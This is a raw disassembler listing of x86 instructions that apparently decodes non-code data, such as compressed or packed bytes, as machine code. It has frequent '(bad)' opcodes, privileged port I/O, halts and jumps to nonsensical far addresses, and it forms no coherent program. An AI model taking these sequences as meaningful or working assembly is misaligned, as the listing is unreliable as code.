  42079d:	dec    ebp
  42079e:	bound  ecx,QWORD PTR ds:0x7d2a20a2
  4207a4:	mov    al,0xa3
  4207a6:	(bad)  
  4207a7:	mov    ebx,0xc07dafe4
  4207ac:	stos   DWORD PTR es:[edi],eax
  4207ad:	test   DWORD PTR [edi],esp
  4207af:	and    DWORD PTR [ebp-0x36cd51fe],0xf709211b
  4207b9:	xchg   esp,eax
  4207ba:	add    dl,BYTE PTR [ecx-0x5a]
  4207bd:	xor    ah,BYTE PTR ds:0x17942303
  4207c3:	cwde   
  4207c4:	push   0xc6dbeb1b
  4207c9:	shl    ebp,cl
  4207cb:	fst    st(4)
  4207cd:	sub    BYTE PTR [ebp+0x6b],cl
  4207d0:	out    dx,eax
  4207d1:	mov    ch,bl
  4207d3:	loope  0x420783
  4207d5:	shr    BYTE PTR [ebp+ebp*1-0x327b3e2a],cl
  4207dc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4207dd:	outs   dx,DWORD PTR ds:[esi]
  4207de:	inc    edi
  4207df:	rol    DWORD PTR [edx],1
  4207e1:	sahf   
  4207e2:	pushf  
  4207e3:	sbb    al,0x5c
  4207e5:	mov    cl,0xdc
  4207e7:	call   0x5142a06b
  4207ec:	call   0xb4b5d04a
  4207f1:	sahf   
  4207f2:	xchg   edi,eax
  4207f3:	jmp    0x65ce:0x4e357968
  4207fa:	pushf  
  4207fb:	in     al,dx
  4207fc:	rcl    esi,0x77
  4207ff:	ffree  st(7)
  420801:	fstp   DWORD PTR [eax+0x388325c0]
  420807:	mov    ebp,0xea0613a8
  42080c:	in     al,0xd0
  42080e:	imul   eax,DWORD PTR [esi],0x4add706
  420814:	lock lods eax,DWORD PTR ds:[esi]
  420816:	mov    al,ds:0x3248fc5c
  42081b:	xor    BYTE PTR [eax],bl
  42081d:	imul   eax,DWORD PTR [eax-0xc6d1309],0x523e1c99
  420827:	aam    0x0
  420829:	add    BYTE PTR [ebp+ecx*2+0x4a],al
  42082d:	dec    ebx
  42082e:	dec    ebx
  42082f:	dec    edi
  420830:	inc    ebp
  420831:	dec    edi
  420832:	sub    eax,0xe604921e
  420837:	(bad)  
  420838:	pop    edx
  420839:	fsubr  DWORD PTR [eax-0x69]
  42083c:	add    DWORD PTR [eax],eax
  42083e:	xchg   BYTE PTR [esi],al
  420840:	add    BYTE PTR [eax],al
  420842:	mov    ebp,0xc0fc3dc4
  420847:	mov    WORD PTR [edi+0x27],ds
  42084a:	jb     0x420800
  42084c:	add    edi,esi
  42084e:	push   edi
  42084f:	cmp    DWORD PTR [edi],esp
  420851:	and    eax,0xf84bffc9
  420856:	dec    edx
  420857:	aad    0x2a
  420859:	das    
  42085a:	jbe    0x42086e
  42085c:	sbb    al,0xa0
  42085e:	adc    ebp,edi
  420860:	call   0xf58a1fde
  420865:	push   edi
  420866:	jns    0x420898
  420868:	addr16 leave 
  42086a:	scas   eax,DWORD PTR es:[edi]
  42086b:	mov    edx,0xec45a07a
  420870:	cdq    
  420871:	test   DWORD PTR [esi+0x74],esi
  420874:	xlat   BYTE PTR ds:[ebx]
  420875:	sbb    DWORD PTR [ecx],ebx
  420877:	ja     0x42082e
  420879:	mov    ecx,0xd02a0f3a
  42087e:	xor    BYTE PTR [ecx-0x40],ah
  420881:	jge    0x4208ca
  420883:	sbb    edx,esi
  420885:	ret    0x66b6
  420888:	aad    0xff
  42088a:	xor    dl,BYTE PTR [edx+0x31ef53e2]
  420890:	popa   
  420891:	mov    al,0xa5
  420893:	int    0x1b
  420895:	xor    ebp,DWORD PTR [esi+0x8]
  420898:	hlt    
  420899:	or     al,0x52
  42089b:	push   ecx
  42089c:	cmp    ah,BYTE PTR [edi]
  42089e:	scas   eax,DWORD PTR es:[edi]
  42089f:	mov    edi,0xc736763c
  4208a4:	mov    edx,0x82f34044
  4208a9:	push   0x42
  4208ab:	shl    DWORD PTR [eax],0x88
  4208ae:	(bad)  
  4208af:	enter  0x6128,0x75
  4208b3:	scas   al,BYTE PTR es:[edi]
  4208b4:	push   ds
  4208b5:	ins    DWORD PTR es:[edi],dx
  4208b6:	bound  ebx,QWORD PTR [edx+0x30964bea]
  4208bc:	add    al,0xef
  4208be:	sub    esi,DWORD PTR [esi]
  4208c0:	push   esp
  4208c1:	arpl   WORD PTR [eax+0x8],bx
  4208c4:	fwait
  4208c5:	repz lock xor al,0x19
  4208c9:	aam    0x1d
  4208cb:	adc    al,0xb1
  4208cd:	loope  0x4208c6
  4208cf:	daa    
  4208d0:	sti    
  4208d1:	in     eax,dx
  4208d2:	add    BYTE PTR [edi+ebx*8+0x70],bl
  4208d6:	mov    ecx,DWORD PTR [edi+0xb]
  4208d9:	jecxz  0x420905
  4208db:	mov    ss,WORD PTR [eax+0x33]
  4208de:	pop    DWORD PTR [esi]
  4208e0:	out    dx,eax
  4208e1:	je     0x4208a9
  4208e3:	inc    ebp
  4208e4:	add    ch,dl
  4208e6:	cli    
  4208e7:	iret   
  4208e8:	std    
  4208e9:	mov    DWORD PTR [eax+0x0],ecx
  4208ec:	sti    
  4208ed:	push   0xc075f106
  4208f2:	jno    0x42096a
  4208f4:	not    BYTE PTR es:[ecx]
  4208f7:	inc    ebx
  4208f8:	sbb    al,0xe8
  4208fa:	dec    ecx
  4208fb:	arpl   WORD PTR ds:[ebx+0xe754624],si
  420902:	retf   
  420903:	stos   DWORD PTR es:[edi],eax
  420904:	jmp    FWORD PTR [ebp-0x3cb139c2]
  42090a:	push   edi
  42090b:	test   ebx,edi
  42090d:	pop    es
  42090e:	addr16 leave 
  420910:	jl     0x420951
  420912:	mov    dl,0xd0
  420914:	push   ebp
  420915:	mov    dl,0xa4
  420917:	jns    0x4208a9
  420919:	push   cs
  42091a:	popa   
  42091b:	jbe    0x4208c6
  42091d:	mov    bh,0x19
  42091f:	mov    esp,edx
  420921:	push   esp
  420922:	adc    DWORD PTR [eax-0x7fda3f25],0x4c67478d
  42092c:	scas   eax,DWORD PTR es:[edi]
  42092d:	push   ss
  42092e:	and    eax,0x944b72fc
  420933:	lea    ebx,[edx-0x4fa80b30]
  420939:	inc    esp
  42093a:	fdivr  QWORD PTR [esi]
  42093c:	dec    edi
  42093d:	jmp    0x2511:0x44858cb7
  420944:	pushf  
  420945:	push   0x5f3e72d2
  42094a:	mov    ss,WORD PTR [ebx-0x198ae9c2]
  420950:	xchg   edx,eax
  420951:	lods   al,BYTE PTR ds:[esi]
  420952:	pop    eax
  420953:	addr16 jae 0x4208da
  420956:	and    al,0xe3
  420958:	jbe    0x420900
  42095a:	jnp    0x4209d2
  42095c:	xor    eax,0xbb16656c
  420961:	mov    ebx,0xf4dac3e9
  420966:	out    0x84,eax
  420968:	aaa    
  420969:	adc    esi,DWORD PTR [esi+edx*1+0x14]
  42096d:	cmp    ebp,esp
  42096f:	(bad)  
  420970:	jmp    0xfd16:0xde7820a9
  420977:	inc    ecx
  420978:	adc    DWORD PTR [esi-0x41f93f],0xffffffd0
  42097f:	mov    ds:0x9680d9ea,eax
  420984:	dec    ebp
  420985:	inc    eax
  420986:	mov    esi,0xee826471
  42098b:	scas   eax,DWORD PTR es:[edi]
  42098c:	sti    
  42098d:	xchg   esp,eax
  42098e:	mov    ah,0x53
  420990:	mov    bl,0x16
  420992:	pop    DWORD PTR [ebp-0x4ff4b2c8]
  420998:	ficomp WORD PTR [ebp+ebp*4+0x78]
  42099c:	fbld   TBYTE PTR [ecx]
  42099e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42099f:	xchg   ebx,eax
  4209a0:	push   ebp
  4209a1:	xor    ch,BYTE PTR [edi-0x3e23bdf8]
  4209a7:	mov    bl,0xc2
  4209a9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4209aa:	ds push cs
  4209ac:	dec    eax
  4209ad:	imul   edx,DWORD PTR ds:0x45f1c84a,0xffffff93
  4209b4:	scas   eax,DWORD PTR es:[edi]
  4209b5:	test   eax,0xa86df94a
  4209ba:	and    esi,DWORD PTR [eax+0x60bd3169]
  4209c0:	fsubp  st(0),st
  4209c2:	daa    
  4209c3:	out    dx,eax
  4209c4:	push   ebx
  4209c5:	xor    eax,0xb7730582
  4209ca:	fld    QWORD PTR [eax-0x3e]
  4209cd:	xor    DWORD PTR [eax+eiz*2+0x888cc28],edi
  4209d4:	ficom  WORD PTR [ecx+0x6c]
  4209d7:	in     al,dx
  4209d8:	push   ecx
  4209d9:	ds cs pop ebp
  4209dc:	ins    BYTE PTR es:[edi],dx
  4209dd:	cmp    BYTE PTR [ebx-0x1a],dh
  4209e0:	sub    bh,bh
  4209e2:	mov    edi,0xe40ad1bd
  4209e7:	jo     0x4209ba
  4209e9:	inc    ecx
  4209ea:	mov    cl,0xf
  4209ec:	push   eax
  4209ed:	mov    esp,0x6de26c57
  4209f2:	loop   0x4209ad
  4209f4:	mov    DWORD PTR ds:0xca66dd2d,ecx
  4209fa:	add    BYTE PTR [ebp-0x4975b107],ch
  420a00:	stc    
  420a01:	gs repnz dec edi
  420a04:	jne    0x4209cf
  420a06:	add    dl,cl
  420a08:	(bad)  
  420a09:	popa   
  420a0a:	test   DWORD PTR [esi],ebx
  420a0c:	xor    BYTE PTR [edi-0x8d65c51],cl
  420a12:	mov    cl,0xfa
  420a14:	dec    esi
  420a15:	mov    edi,0x573a8acc
  420a1a:	in     eax,0x2d
  420a1c:	adc    ch,ch
  420a1e:	aaa    
  420a1f:	ja     0x420a6c
  420a21:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420a22:	les    edi,FWORD PTR [ecx]
  420a24:	pusha  
  420a25:	(bad)  
  420a26:	ret    
  420a27:	pop    esi
  420a28:	leave  
  420a29:	imul   al
  420a2b:	(bad)  
  420a2d:	ins    DWORD PTR es:[edi],dx
  420a2e:	mov    ds:0x9d08e44d,eax
  420a33:	into   
  420a34:	inc    edi
  420a35:	mov    ebx,0x9a8b1ffc
  420a3a:	and    al,0xbd
  420a3c:	adc    dl,BYTE PTR [edx+edx*1+0x65]
  420a40:	push   ebp
  420a41:	jns    0x420a8d
  420a43:	stos   DWORD PTR es:[edi],eax
  420a44:	mov    edi,0x83f398e8
  420a49:	or     al,0xc1
  420a4b:	adc    al,0xa
  420a4d:	not    BYTE PTR [ecx+0x6afde1e3]
  420a53:	jp     0x420a7a
  420a55:	sub    ebx,ebx
  420a57:	int3   
  420a58:	ja     0x420a4a
  420a5a:	fbld   TBYTE PTR [ebx-0x50]
  420a5d:	cmp    ch,0x5b
  420a60:	mov    DWORD PTR [ecx],esp
  420a62:	mov    DWORD PTR [ebx-0x29],ebx
  420a65:	mov    al,0xd5
  420a67:	fimul  DWORD PTR [eax]
  420a69:	push   edx
  420a6a:	mov    cl,0x69
  420a6c:	sub    dh,cl
  420a6e:	or     BYTE PTR gs:[ebx],dh
  420a71:	retf   
  420a72:	stos   DWORD PTR es:[edi],eax
  420a73:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420a74:	ret    
  420a75:	int3   
  420a76:	push   esi
  420a77:	mov    cl,0xfa
  420a79:	lods   al,BYTE PTR ds:[esi]
  420a7a:	icebp  
  420a7b:	push   esp
  420a7c:	mov    cl,BYTE PTR [ebx+0x376caf22]
  420a82:	dec    ebp
  420a83:	fsub   DWORD PTR ds:0x852ce94e
  420a89:	pop    ebp
  420a8a:	fsub   DWORD PTR [edi-0x5505a510]
  420a90:	xor    BYTE PTR [ebp-0x361089f],ch
  420a96:	std    
  420a97:	jmp    0xfa7188f7
  420a9c:	inc    edi
  420a9d:	pop    ecx
  420a9e:	inc    esi
  420a9f:	adc    edx,edi
  420aa1:	push   ebp
  420aa2:	cmp    esi,DWORD PTR [eax]
  420aa4:	(bad)  
  420aa5:	or     ecx,DWORD PTR ds:0x6b79814b
  420aab:	bound  eax,QWORD PTR [esi]
  420aad:	lods   eax,DWORD PTR ds:[esi]
  420aae:	mov    eax,ds:0x430925b6
  420ab3:	test   DWORD PTR [ebp+0x514c25fc],esi
  420ab9:	stc    
  420aba:	les    ebp,FWORD PTR gs:[ebx+0x2cc08f57]
  420ac1:	lds    edx,FWORD PTR ds:0x2f9402b6
  420ac7:	pop    ebx
  420ac8:	aaa    
  420ac9:	pop    edx
  420aca:	mov    dh,0xa9
  420acc:	mov    al,0x1c
  420ace:	lahf   
  420acf:	pushf  
  420ad0:	and    BYTE PTR [eax+0x14],dh
  420ad3:	out    dx,al
  420ad4:	or     BYTE PTR ss:0x4461417e,0x69
  420adc:	scas   al,BYTE PTR es:[edi]
  420add:	sub    BYTE PTR [ecx-0x19cde8c6],bl
  420ae3:	out    0x37,ax
  420ae6:	mov    bh,0xb4
  420ae8:	rcl    DWORD PTR [edx+ebx*4],1
  420aeb:	or     BYTE PTR [edi+0x757f8d7d],0xa7
  420af2:	cld    
  420af3:	dec    ebp
  420af4:	mov    esp,DWORD PTR [edi]
  420af6:	shl    BYTE PTR [eax],0x9c
  420af9:	push   0x8ebed80d
  420afe:	mov    al,ds:0x10882b17
  420b03:	or     ebp,DWORD PTR [esi+0x23]
  420b06:	jns    0x420b49
  420b08:	push   esp
  420b09:	ret    0x1e1f
  420b0c:	iret   
  420b0d:	push   ebp
  420b0e:	jae    0x420ae1
  420b10:	mov    ebp,0x8592b5
  420b15:	(bad)  [ebp+0x28]
  420b18:	sbb    al,0x42
  420b1a:	xchg   ebp,eax
  420b1b:	loopne 0x420b8b
  420b1d:	sbb    dh,BYTE PTR [edi+0x37]
  420b20:	in     eax,dx
  420b21:	push   ecx
  420b22:	mov    ecx,0x7a559db
  420b27:	mov    edi,0xd02203d1
  420b2c:	xor    al,0xdf
  420b2e:	repnz or dl,BYTE PTR ds:0x3010090b
  420b35:	in     al,dx
  420b36:	dec    edi
  420b37:	daa    
  420b38:	dec    edi
  420b39:	push   esp
  420b3a:	jae    0x420b8a
  420b3c:	mov    eax,0x74594f1f
  420b41:	mov    dl,0x2
  420b43:	out    0x43,eax
  420b45:	dec    esi
  420b46:	adc    al,0x26
  420b48:	xor    DWORD PTR [ebx-0xe],edx
  420b4b:	mov    bl,0xc7
  420b4d:	or     al,0xbc
  420b4f:	clc    
  420b50:	jmp    0x56e3:0xf147b4c5
  420b57:	and    BYTE PTR [esi+0x3c],bl
  420b5a:	scas   eax,DWORD PTR es:[edi]
  420b5b:	push   ebp
  420b5c:	and    edx,DWORD PTR [edx+0x661e1965]
  420b62:	adc    dh,bh
  420b64:	pop    esi
  420b65:	arpl   sp,di
  420b67:	and    DWORD PTR [eax+edx*1+0x1b],esi
  420b6b:	dec    ebp
  420b6c:	xchg   ebx,eax
  420b6d:	out    0x8e,eax
  420b6f:	adc    BYTE PTR [ebp-0x1615cfe3],bl
  420b75:	xchg   edx,eax
  420b76:	repz lea esi,[esi+0x2a4e336d]
  420b7d:	add    BYTE PTR [ebx+0x7de0c7ac],ch
  420b83:	dec    ecx
  420b85:	in     eax,0xea
  420b87:	cmp    BYTE PTR [ecx-0x6d],ah
  420b8a:	dec    esp
  420b8b:	(bad)  
  420b8c:	mov    WORD PTR [esi],es
  420b8e:	hlt    
  420b8f:	in     eax,dx
  420b90:	pusha  
  420b91:	cs ins BYTE PTR es:[edi],dx
  420b93:	or     al,BYTE PTR [esi]
  420b95:	cmp    al,0xe6
  420b97:	jle    0x420b5f
  420b99:	popa   
  420b9a:	jmp    0x83cd:0xbb8d4a44
  420ba1:	cmp    al,0x73
  420ba3:	lock cwde 
  420ba5:	imul   edx,DWORD PTR [edi-0x253e1989],0xed819740
  420baf:	jp     0x420b68
  420bb1:	inc    edx
  420bb2:	imul   dh
  420bb4:	inc    ecx
  420bb5:	xchg   ebx,eax
  420bb6:	push   cs
  420bb7:	in     eax,0x3c
  420bb9:	jnp    0x420c07
  420bbb:	arpl   dx,si
  420bbd:	std    
  420bbe:	adc    BYTE PTR [ecx-0xf5c9da6],ah
  420bc4:	mov    ecx,0x34af3705
  420bc9:	in     al,dx
  420bca:	sbb    al,0x18
  420bcc:	aam    0x2a
  420bce:	cmc    
  420bcf:	ror    BYTE PTR [edi-0x413a8733],cl
  420bd5:	test   al,0x9d
  420bd7:	mov    edi,0x8b5c1c3
  420bdc:	idiv   DWORD PTR [ebp-0x34]
  420bdf:	in     eax,0x5c
  420be1:	or     eax,0xf253905e
  420be6:	js     0x420bed
  420be8:	pop    es
  420be9:	iret   
  420bea:	mov    ecx,0xb050a76f
  420bef:	sub    al,BYTE PTR [esi]
  420bf1:	loopne 0x420c5b
  420bf3:	mov    ebp,0x2c5e8aa5
  420bf8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420bf9:	outs   dx,DWORD PTR ds:[esi]
  420bfa:	rol    BYTE PTR ds:0x3492d7b8,0xee
  420c01:	jge    0x420bc5
  420c03:	(bad)  
  420c04:	call   DWORD PTR ds:0x44d15358
  420c0a:	or     al,0xd0
  420c0c:	jnp    0x420c01
  420c0e:	add    ch,al
  420c10:	xor    DWORD PTR [ebp-0xe],ebx
  420c13:	pop    ecx
  420c14:	and    edx,DWORD PTR [eax]
  420c16:	aad    0x7f
  420c18:	mov    ecx,0xfc57f0ba
  420c1d:	aad    0xf5
  420c1f:	(bad)  
  420c20:	xlat   BYTE PTR ds:[ebx]
  420c21:	nop
  420c22:	les    edi,FWORD PTR [edi+0x1b]
  420c25:	pushf  
  420c26:	das    
  420c27:	ins    DWORD PTR es:[edi],dx
  420c28:	das    
  420c29:	shr    DWORD PTR [edi+edx*8],1
  420c2c:	inc    esi
  420c2d:	pop    esi
  420c2e:	hlt    
  420c2f:	call   FWORD PTR [esi+eax*2+0x7d3651aa]
  420c36:	add    dl,bl
  420c38:	aam    0xf0
  420c3a:	sub    al,0x4d
  420c3c:	out    0x93,al
  420c3e:	mov    bl,0x63
  420c40:	pop    esp
  420c41:	fwait
  420c42:	adc    al,0x89
  420c44:	rcl    cl,0xb
  420c47:	jge    0x420c96
  420c49:	int    0x7f
  420c4b:	popf   
  420c4c:	scas   al,BYTE PTR es:[edi]
  420c4d:	cld    
  420c4e:	push   0xfffffff6
  420c50:	arpl   WORD PTR [esi],bx
  420c52:	popa   
  420c53:	lahf   
  420c54:	push   ebx
  420c55:	mov    BYTE PTR [ebx-0x7b],dl
  420c58:	push   es
  420c59:	nop
  420c5a:	mov    ds:0x865fe5af,al
  420c5f:	xor    dl,BYTE PTR ds:0xc4fcb84c
  420c65:	push   ebp
  420c66:	xor    bh,BYTE PTR [ebx-0x5f]
  420c69:	mov    ebp,DWORD PTR [eax+0x65c7b76c]
  420c6f:	adc    DWORD PTR [ecx+ebp*4-0x31],ebp
  420c73:	cs mov ecx,0x8f924edd
  420c79:	sbb    ah,bl
  420c7b:	adc    al,0xc9
  420c7d:	dec    ecx
  420c7e:	add    al,0xb2
  420c80:	and    DWORD PTR [edx+0x24],esi
  420c83:	adc    al,0xa
  420c85:	or     DWORD PTR [ebx+0x5985f311],0x4fad8352
  420c8f:	add    ch,BYTE PTR [ebx+0x9d5477]
  420c95:	mov    dl,0x9d
  420c97:	fadd   DWORD PTR ds:0xccd9ed8d
  420c9d:	ins    DWORD PTR es:[edi],dx
  420c9e:	(bad)  
  420c9f:	lahf   
  420ca0:	mov    bl,0x81
  420ca2:	mov    esi,0xe56cd348
  420ca7:	(bad)  
  420ca8:	in     al,dx
  420ca9:	rol    DWORD PTR [edi+0x4d],0xc6
  420cad:	push   0x89bf5538
  420cb2:	push   0xffffffe2
  420cb4:	pop    ebp
  420cb5:	cdq    
  420cb6:	(bad)  
  420cb7:	sbb    al,0x15
  420cb9:	scas   al,BYTE PTR es:[edi]
  420cba:	pop    edi
  420cbb:	shl    DWORD PTR [esi+edi*1+0x2b452614],1
  420cc2:	cmp    eax,0x3628abea
  420cc7:	iret   
  420cc8:	cdq    
  420cc9:	out    dx,al
  420cca:	fdivr  QWORD PTR [ecx+eax*8-0x31]
  420cce:	sub    eax,0xd9d63c2d
  420cd3:	add    dl,BYTE PTR [edx-0x66]
  420cd6:	(bad)  
  420cd7:	out    dx,al
  420cd8:	imul   edx,DWORD PTR [ebx+0x378204cd],0x5b5007ba
  420ce2:	in     al,0xe1
  420ce4:	adc    eax,0xc2a5bf79
  420ce9:	les    ebp,FWORD PTR [ecx-0x62]
  420cec:	out    dx,eax
  420ced:	ins    DWORD PTR es:[edi],dx
  420cee:	loop   0x420c80
  420cf0:	dec    ebx
  420cf1:	retf   
  420cf2:	je     0x420cad
  420cf4:	pop    ecx
  420cf5:	dec    eax
  420cf6:	jbe    0x420cb9
  420cf8:	shr    ebp,1
  420cfa:	adc    BYTE PTR [ebx+0x1a],0x13
  420cfe:	dec    eax
  420cff:	cmp    DWORD PTR [edx],ecx
  420d01:	xchg   ecx,eax
  420d02:	call   0xcb1c9c64
  420d07:	fwait
  420d08:	cld    
  420d09:	cmp    DWORD PTR [esi-0x2b],ecx
  420d0c:	xchg   BYTE PTR [edi],bl
  420d0e:	leave  
  420d0f:	adc    ebp,ebx
  420d11:	mov    BYTE PTR [edi-0x33],ch
  420d14:	shr    DWORD PTR [edi],cl
  420d16:	rcr    ch,cl
  420d18:	push   ebx
  420d19:	mov    eax,0xa9c40beb
  420d1e:	cli    
  420d1f:	push   edi
  420d20:	pop    ds
  420d21:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420d22:	ins    DWORD PTR es:[edi],dx
  420d23:	(bad)  
  420d24:	jns    0x420ce4
  420d26:	outs   dx,BYTE PTR ds:[esi]
  420d27:	mov    al,0xd2
  420d29:	fidivr WORD PTR ds:0xa02dc89a
  420d2f:	iret   
  420d30:	ja     0x420d93
  420d32:	aaa    
  420d33:	adc    DWORD PTR [eax-0x7d568995],ecx
  420d39:	out    0x8a,eax
  420d3b:	out    0x22,eax
  420d3d:	mov    ah,bl
  420d3f:	and    dl,BYTE PTR [edx]
  420d41:	mov    ebx,0xce38ed
  420d46:	pop    ss
  420d47:	cmovs  esi,DWORD PTR ds:0x59e34a69
  420d4e:	clc    
  420d4f:	into   
  420d50:	jmp    0xa752:0x4002b8ee
  420d57:	add    eax,0x8816dcda
  420d5c:	aas    
  420d5d:	es push edi
  420d5f:	mov    ch,0x5f
  420d61:	cwde   
  420d62:	(bad)  
  420d63:	hlt    
  420d64:	or     bl,al
  420d66:	mov    ebp,0xaa3952c1
  420d6b:	leave  
  420d6c:	add    al,0x7a
  420d6e:	ret    
  420d6f:	or     BYTE PTR [esi+0x68],ah
  420d72:	(bad)  
  420d73:	retf   
  420d74:	sub    DWORD PTR [ebp-0x3c7a3c81],edx
  420d7a:	test   eax,0x184395c0
  420d7f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420d80:	repz or dh,al
  420d83:	imul   eax,eax,0x5c07ddfe
  420d89:	cmc    
  420d8a:	jne    0x420d81
  420d8c:	cmc    
  420d8d:	jp     0x420e07
  420d8f:	pop    eax
  420d90:	ja     0x420dce
  420d92:	xor    DWORD PTR [eax],ebx
  420d94:	adc    cl,cl
  420d96:	xor    eax,0x9754d7a6
  420d9b:	push   0xbe1bf0a
  420da0:	repz or eax,0xaef03312
  420da6:	(bad)  
  420da7:	mov    al,0x99
  420da9:	(bad)  
  420dab:	sbb    edi,esp
  420dad:	ror    DWORD PTR [ebp-0x55c826c2],cl
  420db3:	das    
  420db4:	addr16 cdq 
  420db6:	add    ecx,esp
  420db8:	xor    al,0xf9
  420dba:	adc    al,0x7a
  420dbc:	sub    cl,ch
  420dbe:	xor    edi,0xffffffcc
  420dc1:	xlat   BYTE PTR ds:[ebx]
  420dc2:	pop    DWORD PTR [esi-0x46]
  420dc5:	arpl   WORD PTR [edx+0xf6940cc],bp
  420dcb:	(bad)  
  420dcc:	js     0x420e04
  420dce:	add    BYTE PTR [edi+0x25],bh
  420dd1:	or     ecx,DWORD PTR [ebp+0x15784646]
  420dd7:	cmc    
  420dd8:	test   edx,ebp
  420dda:	stc    
  420ddb:	xor    eax,0xc744d446
  420de0:	pushfw 
  420de2:	jmp    0xcf82:0x8d442486
  420de9:	rcr    DWORD PTR fs:[ecx+0x4ed1f18e],cl
  420df0:	mov    ebx,0xee6cd0c5
  420df5:	js     0x420e43
  420df7:	xchg   esi,eax
  420df8:	push   edi
  420df9:	adc    al,0x5
  420dfb:	inc    esi
  420dfc:	xchg   edx,eax
  420dfd:	out    dx,eax
  420dfe:	rcr    DWORD PTR [edx],1
  420e00:	popa   
  420e01:	cmp    cl,BYTE PTR [esi]
  420e03:	cmp    ebx,DWORD PTR [edi]
  420e05:	das    
  420e06:	int    0xa1
  420e08:	jbe    0x420e81
  420e0a:	std    
  420e0b:	jmp    0xdbaa:0xdd7dbbbe
  420e12:	inc    edx
  420e13:	inc    ebx
  420e14:	mov    edx,esp
  420e16:	jmp    DWORD PTR [ebp-0x1b]
  420e19:	gs leave 
  420e1b:	or     eax,DWORD PTR [ecx+eax*8+0x40e27342]
  420e22:	dec    ecx
  420e23:	clc    
  420e24:	adc    DWORD PTR [ebx-0x65],edi
  420e27:	inc    ebp
  420e28:	pop    ebx
  420e29:	cmp    ah,bl
  420e2b:	mov    cl,0x7e
  420e2d:	inc    eax
  420e2e:	es push ebx
  420e30:	and    DWORD PTR [eax+0x52d2cde],ecx
  420e36:	dec    esp
  420e37:	jbe    0x420e51
  420e39:	mov    ds:0xcef9fc8a,eax
  420e3e:	push   0xa97abcc0
  420e43:	mov    esp,0x55470470
  420e48:	fisub  DWORD PTR [esi+0x3b]
  420e4b:	ja     0x420e02
  420e4d:	jecxz  0x420eb6
  420e4f:	dec    esi
  420e50:	and    BYTE PTR [edi+0x58517fbd],ah
  420e56:	sub    al,0x57
  420e58:	cs gs mov edx,0x3827b5a7
  420e5f:	iret   
  420e60:	lea    eax,[edx]
  420e62:	fsub   QWORD PTR [edi]
  420e64:	hlt    
  420e65:	scas   al,BYTE PTR es:[edi]
  420e66:	pop    es
  420e67:	mov    bl,0xf4
  420e69:	repz ret 0x147e
  420e6d:	int    0xfe
  420e6f:	jmp    0x420ea0
  420e71:	clc    
  420e72:	sbb    DWORD PTR [ebx],edi
  420e74:	jmp    0x420e5d
  420e76:	ds lahf 
  420e78:	cmp    al,0x43
  420e7a:	push   ecx
  420e7b:	dec    esp
  420e7c:	rcr    DWORD PTR [esi+0x2763a316],cl
  420e82:	lods   eax,DWORD PTR ds:[esi]
  420e83:	int3   
  420e84:	push   ebx
  420e85:	or     al,0x95
  420e87:	lods   eax,DWORD PTR ds:[esi]
  420e88:	xchg   ebx,eax
  420e89:	mov    cs,WORD PTR [edi+0x16]
  420e8c:	imul   ecx,DWORD PTR [esi],0x8bad0e10
  420e92:	mov    al,0x4b
  420e94:	js     0x420e71
  420e96:	fwait
  420e97:	stc    
  420e98:	or     ch,bh
  420e9a:	jnp    0x420ee6
  420e9c:	pop    edi
  420e9d:	mov    ch,0x8f
  420e9f:	out    0x57,eax
  420ea1:	div    BYTE PTR [ebx+0x1604c6da]
  420ea7:	std    
  420ea8:	and    al,0xf1
  420eaa:	pop    edi
  420eab:	(bad)  
  420eac:	(bad)  
  420ead:	call   0x92f05903
  420eb2:	sub    DWORD PTR [edx],0x17
  420eb5:	(bad)  
  420eb6:	in     eax,dx
  420eb7:	push   esp
  420eb8:	dec    edi
  420eb9:	dec    ecx
  420eba:	pop    esp
  420ebb:	jecxz  0x420ecb
  420ebd:	int3   
  420ebe:	sbb    bh,BYTE PTR [ebx]
  420ec0:	or     al,0x1c
  420ec2:	(bad)  
  420ec3:	mov    edx,0xff4975e1
  420ec8:	add    BYTE PTR [eax],al
  420eca:	push   ebp
  420ecb:	dec    eax
  420ecc:	inc    edx
  420ecd:	push   ebp
  420ece:	pop    edi
  420ecf:	pop    edi
  420ed0:	push   edi
  420ed1:	dec    eax
  420ed2:	cmp    BYTE PTR [esi-0x14],bh
  420ed5:	or     bl,BYTE PTR [esi-0x11b351f1]
  420edb:	popf   
  420edc:	add    DWORD PTR [eax],eax
  420ede:	xchg   BYTE PTR [esi],al
  420ee0:	add    BYTE PTR [eax],al
  420ee2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420ee3:	aaa    
  420ee4:	fild   QWORD PTR [esi-0x11]
  420ee7:	fst    DWORD PTR [esi+esi*1+0x63]
  420eeb:	or     al,0x58
  420eed:	dec    ebx
  420eee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420eef:	fs xchg edx,eax
  420ef1:	out    dx,al
  420ef2:	xchg   edx,eax
  420ef3:	lahf   
  420ef4:	test   BYTE PTR [edx],bl
  420ef6:	call   0x978c:0x96f90b81
  420efd:	or     edx,DWORD PTR [edi+0x2c7513b]
  420f03:	div    DWORD PTR [eax+0x4c]
  420f06:	cmp    eax,0x9814022b
  420f0b:	lds    esi,FWORD PTR [edi]
  420f0d:	fwait
  420f0e:	rol    DWORD PTR ds:0x487c5803,0x7
  420f15:	nop
  420f16:	mov    eax,0x9ec22e7b
  420f1b:	scas   eax,DWORD PTR es:[edi]
  420f1c:	repnz adc al,0xa4
  420f1f:	mov    ds:0x88d7cd74,al
  420f24:	aam    0xdc
  420f26:	mov    BYTE PTR [ecx+0x5b],dl
  420f29:	or     edi,DWORD PTR [ecx+edi*4]
  420f2c:	adc    bl,BYTE PTR [ebx-0x7c0dd202]
  420f32:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420f33:	mov    al,ds:0xbcf97636
  420f38:	push   ebp
  420f39:	cli    
  420f3a:	shl    DWORD PTR [ecx],0x8c
  420f3d:	fdivr  QWORD PTR [esi+0x0]
  420f40:	call   0x2ea545f7
  420f45:	inc    ecx
  420f46:	xor    al,BYTE PTR [eax]
  420f48:	fisttp QWORD PTR [ebx]
  420f4a:	pushf  
  420f4b:	push   ebp
  420f4c:	out    dx,eax
